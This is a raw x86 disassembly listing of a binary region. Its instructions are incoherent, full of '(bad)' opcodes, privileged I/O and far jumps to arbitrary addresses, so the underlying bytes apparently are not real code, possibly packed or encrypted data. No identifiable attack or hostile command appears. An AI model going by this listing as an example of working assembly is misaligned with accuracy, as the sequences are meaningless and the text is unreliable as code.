  426ab4:	jle    0x426a7c
  426ab6:	fwait
  426ab7:	in     eax,dx
  426ab8:	(bad)  
  426ab9:	inc    eax
  426aba:	clc    
  426abb:	mov    WORD PTR [ebp+0x4f7e6953],es
  426ac1:	push   ecx
  426ac2:	and    al,0x38
  426ac4:	mov    esi,0xb74cf6a3
  426ac9:	fcmovnb st,st(5)
  426acb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426acc:	outs   dx,BYTE PTR ds:[esi]
  426acd:	(bad)  
  426acf:	jecxz  0x426b42
  426ad1:	sub    ah,BYTE PTR [eax+0x42a06a42]
  426ad7:	mov    ds:0x517a63f0,al
  426add:	ret    
  426ade:	stc    
  426adf:	cmp    eax,edx
  426ae1:	mov    edx,0x4f595eae
  426ae6:	push   esp
  426ae7:	in     eax,dx
  426ae8:	(bad)  
  426ae9:	outs   dx,BYTE PTR ds:[esi]
  426aea:	pop    ss
  426aeb:	mov    eax,0xf74a
	...
  426b54:	add    BYTE PTR [eax],al
  426b56:	cdq    
  426b57:	sub    BYTE PTR ds:0xdb77bd56,cl
  426b5d:	out    dx,eax
  426b5e:	inc    esi
  426b5f:	sub    DWORD PTR [esi],edi
  426b61:	or     al,0xb8
  426b63:	jg     0x426b55
  426b65:	sahf   
  426b66:	addr16 lahf 
  426b68:	add    DWORD PTR [eax],eax
  426b6a:	add    BYTE PTR [ecx],al
  426b6c:	add    BYTE PTR [eax],al
  426b6e:	xor    cl,BYTE PTR [edx-0x20ef6928]
  426b74:	scas   eax,DWORD PTR es:[edi]
  426b75:	push   0xffffffdd
  426b77:	push   ss
  426b78:	cwde   
  426b79:	rcr    DWORD PTR [ecx-0x1140ec6f],cl
  426b7f:	outs   dx,BYTE PTR ds:[esi]
  426b80:	cmp    eax,esi
  426b82:	jmp    0x13d3:0x6b37593b
  426b89:	adc    bl,BYTE PTR [edx+0x44]
  426b8c:	adc    al,0x9a
  426b8e:	int3   
  426b8f:	cwde   
  426b90:	jl     0x426be8
  426b92:	test   BYTE PTR [ebp+0x49],0x88
  426b96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b97:	ss (bad) 
  426b99:	cli    
  426b9a:	adc    ebp,DWORD PTR [ecx+0x5b8f61ff]
  426ba0:	out    dx,al
  426ba1:	push   es
  426ba2:	fldcw  WORD PTR [ebx-0x1baf277c]
  426ba8:	mov    WORD PTR [ebx+0x45],?
  426bab:	mov    ds:0x3b0affc8,eax
  426bb0:	cmc    
  426bb1:	ins    BYTE PTR es:[edi],dx
  426bb2:	imul   esp,esi,0xcc2ddde7
  426bb8:	sub    edi,ebx
  426bba:	xor    DWORD PTR [edx],esi
  426bbc:	adc    DWORD PTR [esi-0x53],esi
  426bbf:	push   ecx
  426bc0:	jg     0x426bd4
  426bc2:	ss icebp 
  426bc4:	xor    al,BYTE PTR [ebx-0x22]
  426bc7:	fdiv   QWORD PTR [ebp+0x27]
  426bca:	dec    ebp
  426bcb:	shr    DWORD PTR [ebp+0x29],1
  426bce:	rcl    bl,1
  426bd0:	jno    0x426c26
  426bd2:	loop   0x426c31
  426bd4:	and    edi,DWORD PTR [ebx-0x62]
  426bd7:	push   edx
  426bd8:	scas   al,BYTE PTR es:[edi]
  426bd9:	xor    dl,al
  426bdb:	or     DWORD PTR [eax+edi*2],ebp
  426bde:	mov    ds:0x33aeb44e,eax
  426be3:	aam    0x2a
  426be5:	and    ecx,DWORD PTR [ecx-0x5eae558a]
  426beb:	push   0xffffffd7
  426bed:	push   edx
  426bee:	adc    DWORD PTR [ecx-0x2531206b],edx
  426bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426bf5:	stos   BYTE PTR es:[edi],al
  426bf6:	data16 ja 0x426b82
  426bf9:	sbb    edi,DWORD PTR [eax]
  426bfb:	stos   DWORD PTR es:[edi],eax
  426bfc:	sub    ch,0xa2
  426bff:	aaa    
  426c00:	or     al,0x1a
  426c02:	int3   
  426c03:	xor    al,0x31
  426c05:	jnp    0x426c6f
  426c07:	mov    edx,0x14f92f61
  426c0c:	dec    edi
  426c0d:	ins    DWORD PTR es:[edi],dx
  426c0e:	adc    al,0x63
  426c10:	hlt    
  426c11:	ja     0x426bde
  426c13:	push   edx
  426c14:	mov    esp,0xc7abac8
  426c19:	push   edx
  426c1a:	pop    esp
  426c1b:	punpckldq mm7,mm1
  426c1e:	or     al,0xc7
  426c20:	xor    BYTE PTR [ecx+0x53],cl
  426c23:	lods   eax,DWORD PTR ds:[esi]
  426c24:	out    0xe0,al
  426c26:	daa    
  426c27:	ret    
  426c28:	std    
  426c29:	enter  0xdcd2,0x57
  426c2d:	mov    al,0x78
  426c2f:	lds    edi,FWORD PTR [ecx-0x7030a5f]
  426c35:	jne    0x426c8f
  426c37:	jg     0x426cb5
  426c39:	mov    ebp,0x2dacc053
  426c3e:	push   cs
  426c3f:	or     ch,bl
  426c41:	push   ebx
  426c42:	ror    cl,0x3d
  426c45:	cmp    edi,edi
  426c47:	and    cl,ah
  426c49:	inc    ebp
  426c4a:	bound  eax,QWORD PTR [ebx+0x7c]
  426c4d:	and    BYTE PTR [edi-0x27],bl
  426c50:	xchg   BYTE PTR [ecx-0x3280925f],dl
  426c56:	pusha  
  426c57:	outs   dx,BYTE PTR ds:[esi]
  426c58:	or     DWORD PTR [ecx],edx
  426c5a:	inc    eax
  426c5b:	jmp    0x5932:0x106321d3
  426c62:	(bad)  
  426c63:	jmp    0x66d7:0xf7c084b2
  426c6a:	in     al,0x12
  426c6c:	retf   0x6f
	...
  426cd3:	add    BYTE PTR [eax],al
  426cd5:	add    dl,ah
  426cd7:	pusha  
  426cd8:	test   DWORD PTR [esi+0x74f3f787],esi
  426cde:	mov    ah,0xeb
  426ce0:	cld    
  426ce1:	mov    edx,0xec0f364b
  426ce6:	addr16 mov al,ds:0x1
  426cea:	add    BYTE PTR [ecx],al
  426cec:	add    BYTE PTR [eax],al
  426cee:	jmp    0xb848:0x35a6b181
  426cf5:	jg     0x426d05
  426cf7:	ja     0x426cde
  426cf9:	jne    0x426d17
  426cfb:	fiadd  WORD PTR [ebp-0x1762c268]
  426d01:	and    DWORD PTR [ecx+esi*1],eax
  426d04:	push   ss
  426d05:	dec    edi
  426d06:	out    0x23,eax
  426d08:	cmp    al,0x1
  426d0a:	test   BYTE PTR [edx+0x57747d85],al
  426d10:	mov    ebx,0xabd2c497
  426d15:	das    
  426d16:	mov    ebx,0x9fcb6bbe
  426d1b:	idiv   DWORD PTR [eax]
  426d1d:	divps  xmm7,XMMWORD PTR [esi]
  426d20:	ins    BYTE PTR es:[edi],dx
  426d21:	pop    ecx
  426d22:	test   al,0xa7
  426d24:	inc    esi
  426d25:	sti    
  426d26:	mov    es,WORD PTR [edx]
  426d28:	aaa    
  426d29:	lods   al,BYTE PTR ds:[esi]
  426d2a:	fnstenv [ebx-0x6a90c9c4]
  426d30:	mov    bh,0x39
  426d32:	inc    edx
  426d33:	dec    BYTE PTR [eax+eax*8]
  426d36:	sbb    BYTE PTR [eax-0x6d8066e6],bl
  426d3c:	out    dx,al
  426d3d:	unpcklps xmm1,XMMWORD PTR [esi]
  426d40:	sbb    BYTE PTR [edi-0x26],cl
  426d43:	xor    ch,BYTE PTR [edx+0x3d]
  426d46:	mov    bl,0xbb
  426d48:	ror    ebp,0x82
  426d4b:	xlat   BYTE PTR ds:[ebx]
  426d4c:	xchg   edi,eax
  426d4d:	jbe    0x426d4b
  426d4f:	imul   ebp,edi,0xbf7fe847
  426d55:	out    0xb0,eax
  426d57:	add    bl,BYTE PTR [edi+0x79937c6e]
  426d5d:	jmp    FWORD PTR [edi+0x5eaf0dcb]
  426d63:	jno    0x426d62
  426d65:	dec    ebp
  426d66:	test   eax,0xfce24a70
  426d6b:	ss cs enter 0x2667,0x9c
  426d71:	test   DWORD PTR es:[ebp-0xbef7e8d],esp
  426d78:	inc    edx
  426d79:	mov    WORD PTR [edi+0x4d477774],es
  426d7f:	popa   
  426d80:	sbb    bh,0x12
  426d83:	loop   0x426de3
  426d85:	sub    cl,BYTE PTR [ebx+0x1e4b579c]
  426d8b:	add    ah,BYTE PTR ds:0xc60950b8
  426d91:	sub    DWORD PTR [ecx-0x29],ebp
  426d94:	cwde   
  426d95:	sbb    eax,0x4599f90c
  426d9a:	pop    edi
  426d9b:	and    eax,0x7f20e6d1
  426da0:	fisub  DWORD PTR [ecx+0x15]
  426da3:	pusha  
  426da4:	xchg   edi,eax
  426da5:	dec    ecx
  426da6:	mov    edi,0xb9408e13
  426dab:	xchg   esp,eax
  426dac:	mov    ebp,0x685a73d9
  426db1:	jne    0x426daa
  426db3:	aam    0xd8
  426db5:	mov    eax,ds:0x3784f444
  426dba:	sti    
  426dbb:	jg     0x426d54
  426dbd:	jmp    0x4054cacb
  426dc2:	add    esi,ebp
  426dc4:	cli    
  426dc5:	inc    eax
  426dc6:	and    BYTE PTR [edi-0x45],bl
  426dc9:	push   eax
  426dca:	sti    
  426dcb:	mov    cl,0x3b
  426dcd:	rol    edi,cl
  426dcf:	xor    ebp,DWORD PTR [esp+esi*4+0x66]
  426dd3:	arpl   WORD PTR [ebp+0x48],bp
  426dd6:	test   DWORD PTR [eax+0x42425d54],ebp
  426ddc:	sti    
  426ddd:	retf   0xb1dc
  426de0:	gs (bad) 
  426de2:	pop    es
  426de3:	out    dx,al
  426de4:	add    BYTE PTR ds:[ebx-0x38],dh
  426de8:	popf   
  426de9:	push   0x65
  426deb:	(bad)  
  426dec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ded:	out    0x0,al
	...
  426e53:	add    BYTE PTR [eax],al
  426e55:	add    BYTE PTR [edx],cl
  426e57:	mov    cl,0x61
  426e59:	repz sti 
  426e5b:	repz call 0xa0c:0xc7c2ecf9
  426e63:	add    eax,0xa16791ec
  426e68:	add    DWORD PTR [eax],eax
  426e6a:	add    BYTE PTR [ecx],al
  426e6c:	add    BYTE PTR [eax],al
  426e6e:	jecxz  0x426ecf
  426e70:	fnstsw WORD PTR [eax]
  426e72:	jns    0x426e77
  426e74:	xchg   ebx,eax
  426e75:	push   esp
  426e76:	adc    BYTE PTR [ebp+0x15],ah
  426e79:	sub    al,0x3e
  426e7b:	mov    ch,0xc
  426e7d:	in     eax,0xca
  426e7f:	nop
  426e80:	jbe    0x426e0a
  426e82:	mov    ch,0x4f
  426e84:	mov    dh,ch
  426e86:	sub    BYTE PTR ds:0x64df1fe6,al
  426e8c:	jmp    0x8ae0:0x8aa59c7b
  426e93:	mov    esi,0xdfbd3c28
  426e98:	call   0x26f0b59c
  426e9d:	push   ds
  426e9e:	jmp    0xe2f65d84
  426ea3:	or     DWORD PTR [edi+0x7f042b7c],esp
  426ea9:	shr    DWORD PTR [ebp-0x1242d9c1],1
  426eaf:	rcl    DWORD PTR [ebx+0x10],1
  426eb2:	(bad)  
  426eb3:	pusha  
  426eb4:	mov    ds:0xbc7d2621,eax
  426eb9:	call   0x81a9:0x5a4e586a
  426ec0:	pop    ebx
  426ec1:	jbe    0x426f2b
  426ec3:	test   eax,0x26080c77
  426ec8:	nop
  426ec9:	test   BYTE PTR [esp+esi*4],dh
  426ecc:	push   edi
  426ecd:	lahf   
  426ece:	pop    edx
  426ecf:	enter  0xfdab,0x69
  426ed3:	inc    esp
  426ed4:	in     eax,0xe6
  426ed6:	mov    DWORD PTR [ebx+0x2ce402d5],ebp
  426edc:	mov    al,0x2d
  426ede:	mov    ds:0xcff87155,al
  426ee3:	pop    esi
  426ee4:	xchg   edx,eax
  426ee5:	jecxz  0x426e91
  426ee7:	mov    esp,0xbd0a4049
  426eec:	aam    0xc7
  426eee:	jmp    DWORD PTR [edx+0x4b]
  426ef1:	xchg   ebx,eax
  426ef2:	adc    ah,BYTE PTR [ecx-0x3501104d]
  426ef8:	push   ds
  426ef9:	(bad)  
  426efa:	lock add BYTE PTR [esi],ah
  426efd:	dec    ecx
  426efe:	(bad)  
  426eff:	icebp  
  426f00:	mov    eax,ds:0xbb308f40
  426f05:	mul    DWORD PTR [edx-0x301de7fb]
  426f0b:	(bad)  
  426f0c:	pop    edi
  426f0d:	(bad)  
  426f0e:	shl    BYTE PTR ds:0x3a64f79,0xa5
  426f15:	and    BYTE PTR [eax],0x79
  426f18:	mov    edx,0x832fad29
  426f1d:	sbb    BYTE PTR [edx+0x11d8930d],bh
  426f23:	jle    0x426eb6
  426f25:	sub    al,BYTE PTR [eax]
  426f27:	dec    edi
  426f28:	call   0x7e63:0x614ff4a7
  426f2f:	sbb    al,0xfa
  426f31:	stc    
  426f32:	mov    dl,0x96
  426f34:	sbb    ch,BYTE PTR [eax-0x50]
  426f37:	pop    eax
  426f38:	clc    
  426f39:	and    ebx,DWORD PTR [ebx+0x1919e046]
  426f3f:	inc    ecx
  426f40:	cmp    al,0x3
  426f42:	je     0x426f88
  426f44:	jp     0x426eef
  426f46:	xchg   esi,eax
  426f47:	sub    BYTE PTR [edi-0x7805771d],bl
  426f4d:	xchg   edx,eax
  426f4e:	inc    ecx
  426f4f:	test   DWORD PTR [edi+0x26],edi
  426f52:	scas   al,BYTE PTR es:[edi]
  426f53:	loop   0x426efb
  426f55:	jns    0x426eee
  426f57:	jecxz  0x426f17
  426f59:	push   DWORD PTR [ebx-0x55]
  426f5c:	gs mov bl,0x8c
  426f5f:	pop    ecx
  426f60:	pop    ss
  426f61:	pop    eax
  426f62:	or     eax,DWORD PTR [edx+edx*4]
  426f65:	xor    eax,DWORD PTR [ebp+0x6b9edf0b]
  426f6b:	inc    ebp
  426f6c:	jmp    0x426f50
	...
  426fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fd7:	mov    ds:0xf5c7f1c7,al
  426fdc:	mov    dh,0xf7
  426fde:	inc    edi
  426fdf:	inc    ecx
  426fe0:	add    DWORD PTR [eax+edi*1+0x67cc5bf6],esp
  426fe7:	mov    ds:0x1000001,al
  426fec:	add    BYTE PTR [eax],al
  426fee:	xchg   ebx,eax
  426fef:	adc    eax,ecx
  426ff1:	xchg   edi,eax
  426ff2:	test   ch,0x56
  426ff5:	nop
  426ff6:	pop    edi
  426ff7:	mov    DWORD PTR [eax],0xbb6c8895
  426ffd:	lock cmp al,0x40
  427000:	shl    dl,cl
  427002:	outs   dx,DWORD PTR ds:[esi]
  427003:	cld    
  427004:	popf   
  427005:	dec    eax
  427006:	jmp    0x427086
  427008:	pop    esp
  427009:	cmp    DWORD PTR [edx],esp
  42700b:	ds std 
  42700d:	xchg   esp,eax
  42700e:	push   ss
  42700f:	mov    ebx,0xf24e9b48
  427014:	push   cs
  427015:	shr    edi,1
  427017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427018:	push   ds
  427019:	and    DWORD PTR [edi-0x78bdd6c3],ebp
  42701f:	aaa    
  427020:	and    bl,BYTE PTR [ecx+0x27]
  427023:	loope  0x427099
  427025:	cmp    BYTE PTR [esi+edi*1-0x4e],bl
  427029:	xor    eax,DWORD PTR [ecx+0x48f30914]
  42702f:	mov    ebp,0xb453a40d
  427034:	hlt    
  427035:	test   eax,0x7a05ab21
  42703a:	inc    eax
  42703b:	fist   DWORD PTR [esi+ebp*8-0x41eea8d1]
  427042:	xchg   ecx,eax
  427043:	pop    ebp
  427044:	(bad)  
  427045:	sub    al,0x5c
  427047:	sub    al,0x29
  427049:	mov    ch,0xeb
  42704b:	dec    esp
  42704c:	in     eax,0x3e
  42704e:	dec    esi
  42704f:	sub    eax,0x22d7b25d
  427054:	dec    edx
  427055:	iret   
  427056:	sub    edx,DWORD PTR [ebx+edi*8-0x78]
  42705a:	aas    
  42705b:	lods   al,BYTE PTR ds:[esi]
  42705c:	dec    edx
  42705d:	aam    0x90
  42705f:	xor    al,0x4a
  427061:	cmp    eax,0x2e3b9558
  427066:	push   0xffffffe1
  427068:	stos   DWORD PTR es:[edi],eax
  427069:	dec    ecx
  42706a:	lock popa 
  42706c:	ds pop esp
  42706e:	retf   0x75e9
  427071:	ror    BYTE PTR [edi+0x5eecb6e6],1
  427077:	dec    eax
  427078:	fsub   QWORD PTR [eax]
  42707a:	cmp    eax,0x6231d3f2
  427080:	mov    bl,0xba
  427082:	and    BYTE PTR [edi+0x68],ah
  427085:	and    DWORD PTR [esi-0x40],0x8b6cfbff
  42708c:	pminsw mm7,QWORD PTR [edx+0x67]
  427090:	sar    DWORD PTR [esp+ebx*4-0x31],cl
  427094:	adc    al,0x41
  427096:	aas    
  427097:	jo     0x427094
  427099:	sbb    bh,BYTE PTR [ecx]
  42709b:	mov    cs,WORD PTR [ecx-0x55]
  42709e:	mov    esp,0x67c137e7
  4270a3:	shr    DWORD PTR [eax],1
  4270a5:	pop    ebx
  4270a6:	leave  
  4270a7:	aas    
  4270a8:	xchg   BYTE PTR [edi+0x5b],ch
  4270ab:	pop    ebx
  4270ac:	das    
  4270ad:	and    al,0x8a
  4270af:	sub    BYTE PTR [edx],ah
  4270b1:	mul    BYTE PTR [ebp+0x4d]
  4270b4:	inc    esi
  4270b5:	jo     0x4270bd
  4270b7:	inc    eax
  4270b8:	dec    ebp
  4270b9:	in     al,dx
  4270ba:	aam    0x92
  4270bc:	sub    BYTE PTR [ecx],bh
  4270be:	jns    0x42708d
  4270c0:	test   eax,0x7336fb87
  4270c5:	lock lods eax,DWORD PTR ds:[esi]
  4270c7:	or     bh,BYTE PTR [esi+edi*8-0x1923a2c3]
  4270ce:	xor    ebx,DWORD PTR [ebx+0x6b]
  4270d1:	sub    ebp,DWORD PTR [ebp-0x35008239]
  4270d7:	mov    ebx,0xa4959b73
  4270dc:	aad    0x9f
  4270de:	mov    ebp,0xd7956681
  4270e3:	in     eax,0xfb
  4270e5:	adc    esi,DWORD PTR [edi]
  4270e7:	gs dec edx
  4270e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4270ea:	(bad)  
  4270eb:	sub    si,cx
	...
  427156:	or     al,0x6d
  427158:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42715e:	inc    esp
  42715f:	mov    ebp,0xd529d96
  427164:	or     BYTE PTR [ebx],ch
  427166:	addr16 mov ds:0x1,eax
  42716a:	add    BYTE PTR [ecx],al
  42716c:	add    BYTE PTR [eax],al
  42716e:	outs   dx,BYTE PTR ds:[esi]
  42716f:	push   edx
  427170:	mov    edi,0x38b1d57b
  427175:	dec    esp
  427176:	jb     0x427177
  427178:	or     edi,DWORD PTR [ebp+eiz*8+0x27]
  42717c:	addr16 in eax,dx
  42717e:	ins    BYTE PTR es:[edi],dx
  42717f:	push   ebp
  427180:	push   ss
  427181:	inc    ecx
  427182:	ins    DWORD PTR es:[edi],dx
  427183:	xchg   ebx,eax
  427184:	xchg   esi,eax
  427185:	call   0x16aa1cc8
  42718a:	jo     0x427152
  42718c:	pop    edi
  42718d:	test   DWORD PTR [ebx-0x275987b2],esi
  427193:	call   0xae75:0xddc631a6
  42719a:	sub    ecx,DWORD PTR ds:0xf0da6fb7
  4271a0:	and    esi,edx
  4271a2:	iret   
  4271a3:	mov    ?,WORD PTR [esi]
  4271a5:	pop    ds
  4271a6:	or     bl,al
  4271a8:	enter  0x42a5,0x3f
  4271ac:	xchg   BYTE PTR [eax],dl
  4271ae:	adc    ecx,ebx
  4271b0:	js     0x4271ef
  4271b2:	in     eax,dx
  4271b3:	sahf   
  4271b4:	mov    ds:0xe605972f,eax
  4271b9:	xor    eax,0xbff1a55a
  4271be:	cmp    DWORD PTR [esi+edx*1],ebx
  4271c1:	push   cs
  4271c2:	popf   
  4271c3:	(bad)  
  4271c4:	push   edx
  4271c5:	jns    0x427197
  4271c7:	or     eax,0x697fcbf4
  4271cc:	push   esi
  4271cd:	(bad)  
  4271ce:	test   eax,0x1e2ab1bf
  4271d3:	imul   ebp,DWORD PTR [esi-0x71],0xffffffd8
  4271d7:	daa    
  4271d8:	adc    eax,0x86b8a02c
  4271dd:	fnsave [eax*8+0xfa4b8cf]
  4271e4:	leave  
  4271e5:	sti    
  4271e6:	popa   
  4271e7:	adc    al,0x8
  4271e9:	add    al,0x6a
  4271eb:	jnp    0x42720d
  4271ed:	test   BYTE PTR es:[ecx+eiz*8],al
  4271f1:	fist   WORD PTR [esi-0xed42437]
  4271f7:	xor    ebx,DWORD PTR [edi-0x5cb6e787]
  4271fd:	lods   al,BYTE PTR ds:[esi]
  4271fe:	pop    esp
  4271ff:	or     ebp,eax
  427201:	pop    es
  427202:	ret    0x4e2a
  427205:	call   0xee42e124
  42720a:	retf   0x30ce
  42720d:	push   ss
  42720e:	inc    esi
  42720f:	xchg   esp,eax
  427210:	dec    esi
  427211:	dec    esi
  427212:	xor    eax,0x6efe20f3
  427217:	push   ds
  427218:	pop    ebx
  427219:	clc    
  42721a:	mov    ds:0x3d12fab5,al
  42721f:	inc    esi
  427220:	mov    cl,0x61
  427222:	test   eax,0xbe368108
  427227:	mov    bh,0xfb
  427229:	fadd   st(0),st
  42722b:	mov    eax,0x63e7f38b
  427230:	out    dx,al
  427231:	ficomp WORD PTR [ebx-0x12]
  427234:	add    dl,BYTE PTR [ecx+0x50]
  427237:	sub    ch,ch
  427239:	sub    al,0x35
  42723b:	inc    edx
  42723c:	inc    eax
  42723d:	stos   DWORD PTR es:[edi],eax
  42723e:	mov    ?,WORD PTR [edx+eiz*4]
  427241:	aas    
  427242:	jle    0x42725b
  427244:	test   al,0x74
  427246:	fild   DWORD PTR [ebx]
  427248:	xchg   edx,eax
  427249:	fwait
  42724a:	xchg   edx,eax
  42724b:	lods   al,BYTE PTR ds:[esi]
  42724c:	arpl   ax,dx
  42724e:	je     0x42722b
  427250:	repnz push esp
  427252:	lods   eax,DWORD PTR ds:[esi]
  427253:	pop    ecx
  427254:	pop    edx
  427255:	inc    esi
  427256:	jo     0x427209
  427258:	inc    ecx
  427259:	mov    ah,BYTE PTR ds:0xa859c60c
  42725f:	mov    eax,0x77fb97d6
  427264:	mov    eax,ds:0xef5c6cad
  427269:	mov    edx,es
  42726b:	jns    0x4272e8
  42726d:	rol    DWORD PTR [eax],cl
	...
  4272d3:	add    BYTE PTR [eax],al
  4272d5:	add    BYTE PTR [esi],bl
  4272d7:	inc    ecx
  4272d8:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  4272df:	push   ecx
  4272e0:	dec    ebp
  4272e1:	mov    ds:0x70f7011,al
  4272e6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4272e8:	add    DWORD PTR [eax],eax
  4272ea:	add    BYTE PTR [ecx],al
  4272ec:	add    BYTE PTR [eax],al
  4272ee:	jo     0x427311
  4272f0:	gs ins BYTE PTR es:[edi],dx
  4272f2:	push   ss
  4272f3:	xchg   esp,eax
  4272f4:	lea    eax,[esi+0x78038285]
  4272fa:	mov    dh,0x9f
  4272fc:	test   DWORD PTR [eax+0x24],edi
  4272ff:	in     eax,0xcc
  427301:	push   0xd19e2ceb
  427306:	jae    0x4272d6
  427308:	leave  
  427309:	and    DWORD PTR [ebx],edi
  42730b:	dec    eax
  42730c:	imul   esp,DWORD PTR [esi],0xffffffba
  42730f:	repnz mov bl,0xaa
  427312:	call   0xc6a5:0x1f4bee62
  427319:	push   0x53
  42731b:	push   0x7e
  42731d:	mov    cl,0x12
  42731f:	out    dx,eax
  427320:	clc    
  427321:	dec    ebx
  427322:	dec    ebp
  427323:	push   edi
  427324:	(bad)  
  427325:	into   
  427326:	dec    ecx
  427327:	jae    0x42739f
  427329:	data16 sti 
  42732b:	dec    ebx
  42732c:	stc    
  42732d:	mov    ebx,0x122f36a2
  427332:	add    DWORD PTR [edx-0x19694a79],ebx
  427338:	jmp    0x35f6d087
  42733d:	inc    edx
  42733e:	les    edx,FWORD PTR [ebp+eiz*1+0x51d4ac80]
  427345:	inc    ecx
  427346:	stos   DWORD PTR es:[edi],eax
  427347:	or     eax,0xc8b0e7af
  42734c:	repz mov eax,ds:0x2822b76
  427352:	dec    edx
  427353:	mov    ah,0x2
  427355:	xor    BYTE PTR [ebx],ah
  427357:	lods   eax,DWORD PTR ds:[esi]
  427358:	push   esi
  427359:	aam    0x32
  42735b:	mov    dh,BYTE PTR [edi+0x33d2b41c]
  427361:	shr    BYTE PTR [esi+0x69a8634e],cl
  427367:	in     eax,dx
  427368:	jmp    0x2bed:0x3c97cce3
  42736f:	push   eax
  427370:	pusha  
  427371:	mov    cl,0xed
  427373:	push   0x1a
  427375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427376:	xor    eax,0x9f2632b5
  42737b:	add    dh,cl
  42737d:	ja     0x4273b0
  42737f:	jle    0x42735e
  427381:	hlt    
  427382:	cdq    
  427383:	jne    0x42730d
  427385:	sbb    eax,0xd3f79885
  42738a:	fimul  DWORD PTR [eax]
  42738c:	and    BYTE PTR [edx+ecx*8+0x52cba121],0x32
  427394:	das    
  427395:	cmp    BYTE PTR [eax-0x40],cl
  427398:	inc    eax
  427399:	test   DWORD PTR [ebx],ebx
  42739b:	mov    edx,0xe6f9e259
  4273a0:	gs push eax
  4273a2:	sbb    al,0x57
  4273a4:	or     BYTE PTR [esi],al
  4273a6:	or     dh,BYTE PTR [edx]
  4273a8:	mul    DWORD PTR ds:[eax-0x63]
  4273ac:	or     BYTE PTR [esi+0x2f1d968c],bl
  4273b2:	retf   0x8897
  4273b5:	jae    0x427409
  4273b7:	sub    eax,0x7aa9a6ed
  4273bc:	add    al,0xaa
  4273be:	and    edx,edx
  4273c0:	xor    edi,DWORD PTR [edx]
  4273c2:	mov    ebx,0x2790c7e6
  4273c7:	jnp    0x427358
  4273c9:	sbb    DWORD PTR [edx+0x5213ae2f],esp
  4273cf:	add    al,0xca
  4273d1:	and    cl,ch
  4273d3:	jge    0x4273a1
  4273d5:	test   bh,ch
  4273d7:	test   eax,0x136953a1
  4273dc:	dec    eax
  4273dd:	xor    DWORD PTR [edx],edx
  4273df:	jmp    0xcdd3:0x6c29bfea
  4273e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273e7:	inc    DWORD PTR [ebp+eiz*8-0xe221b8f]
	...
  427456:	adc    bl,BYTE PTR ds:0xaf3f8832
  42745c:	mov    edx,0x29f0389f
  427461:	sbb    esi,DWORD PTR [ebx+eax*4+0x5f]
  427465:	imul   esp,DWORD PTR [edi-0x5b],0x1000001
  42746c:	add    BYTE PTR [eax],al
  42746e:	sbb    al,BYTE PTR [ebx+0x2b]
  427471:	inc    ebx
  427472:	ja     0x42740d
  427474:	push   esi
  427475:	loope  0x427479
  427477:	push   eax
  427478:	inc    edi
  427479:	mov    dl,0xa4
  42747b:	in     eax,0xfb
  42747d:	push   edi
  42747e:	inc    esi
  42747f:	jmp    0x2579f811
  427484:	shr    BYTE PTR [ebx-0x6ebb5720],1
  42748a:	in     eax,dx
  42748b:	stos   BYTE PTR es:[edi],al
  42748c:	mov    dl,0x23
  42748e:	mov    al,0x52
  427490:	inc    ecx
  427491:	fdivr  DWORD PTR [edx+ecx*1]
  427494:	aaa    
  427495:	jb     0x42741c
  427497:	push   edx
  427498:	dec    esi
  427499:	pop    es
  42749a:	jno    0x427466
  42749c:	xchg   ecx,eax
  42749d:	loopne 0x427451
  42749f:	inc    esi
  4274a0:	or     BYTE PTR [esi+edx*8+0x76d39833],al
  4274a7:	test   eax,0xc8aabaf1
  4274ac:	xchg   ebx,eax
  4274ad:	int3   
  4274ae:	jo     0x42744c
  4274b0:	shr    bh,1
  4274b2:	dec    edi
  4274b3:	sbb    eax,ebp
  4274b5:	ins    BYTE PTR es:[edi],dx
  4274b6:	int    0x42
  4274b8:	(bad)  
  4274ba:	pop    ebx
  4274bb:	xchg   BYTE PTR [edx],bh
  4274bd:	jmp    DWORD PTR [ebx+0x6d]
  4274c0:	out    dx,eax
  4274c1:	cmp    BYTE PTR [eax+0x64032202],0x37
  4274c8:	popa   
  4274c9:	lods   al,BYTE PTR ds:[esi]
  4274ca:	sub    DWORD PTR [ecx+0x1c],ebp
  4274cd:	mov    BYTE PTR [ebp+0x760c47b2],dl
  4274d3:	jo     0x42748d
  4274d5:	inc    ebp
  4274d6:	xor    ch,BYTE PTR [eax]
  4274d8:	fisub  WORD PTR [ecx-0x368b7da5]
  4274de:	mov    bl,0x19
  4274e0:	loop   0x42755c
  4274e2:	jae    0x42755d
  4274e4:	and    eax,0xd161b35b
  4274e9:	test   DWORD PTR [ecx-0x4a],edx
  4274ec:	jmp    0x88a8:0x8716bff8
  4274f3:	stos   BYTE PTR es:[edi],al
  4274f4:	aad    0x62
  4274f6:	xor    DWORD PTR [eax],ebx
  4274f8:	iret   
  4274f9:	jmp    0x7d351cad
  4274fe:	fistp  DWORD PTR [esi-0x63cf456d]
  427504:	popa   
  427505:	ss and edi,esi
  427508:	mov    ss,WORD PTR [esi]
  42750a:	push   0xffffffbf
  42750c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42750d:	and    esp,DWORD PTR [ebx]
  42750f:	add    dl,bl
  427511:	js     0x42751a
  427513:	in     eax,0x3d
  427515:	ficomp WORD PTR [edx]
  427517:	fistp  WORD PTR [eax+0x53493af]
  42751d:	imul   ebp,edi,0xffffffd5
  427520:	fucomip st,st(2)
  427522:	(bad)  
  427523:	retf   0x86b1
  427526:	mov    ds,WORD PTR [edx]
  427528:	add    eax,0xe964c1a
  42752d:	imul   esp,DWORD PTR [ebp-0x5b],0x2637531b
  427534:	xchg   edi,eax
  427535:	in     eax,0x34
  427537:	clc    
  427538:	out    dx,al
  427539:	jg     0x427535
  42753b:	xor    DWORD PTR [esi+0x4a],0x50a654a0
  427542:	iret   
  427543:	cdq    
  427544:	ret    
  427545:	retf   
  427546:	push   edi
  427547:	push   0xc8dd956d
  42754c:	cld    
  42754d:	push   ds
  42754e:	ret    0xe25e
  427551:	fldcw  WORD PTR [edi]
